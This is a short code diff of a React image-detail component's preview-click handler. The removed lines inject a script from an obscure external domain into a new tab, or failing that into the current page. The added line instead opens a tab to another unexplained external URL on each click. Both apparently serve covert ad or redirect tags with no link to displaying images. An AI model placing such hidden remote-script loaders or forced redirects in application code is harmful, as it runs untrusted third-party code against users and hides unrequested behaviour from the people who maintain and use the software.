@@ -20,25 +20,7 @@ export default function ImageDetail(props) {
         </div>
       }
       onPreviewClick={() => {
-        try {
-          // Open a new tab within the same user gesture
-          const w = window.open('about:blank', '_blank', 'noopener,noreferrer');
-          if (w && w.document) {
-            const s = w.document.createElement('script');
-            s.dataset.zone = '9906397';
-            s.src = 'https://forfrogadiertor.com/tag.min.js';
-            // Ensure body exists
-            const t = w.document.body || w.document.documentElement;
-            t.appendChild(s);
-          } else {
-            // Fallback: inject into current document
-            const s = document.createElement('script');
-            s.dataset.zone = '9906397';
-            s.src = 'https://forfrogadiertor.com/tag.min.js';
-            const target = [document.documentElement, document.body].filter(Boolean).pop();
-            target.appendChild(s);
-          }
-        } catch {}
+        try { window.open('https://otieu.com/4/9924601', '_blank', 'noopener,noreferrer'); } catch {}
       }}
     />
   );
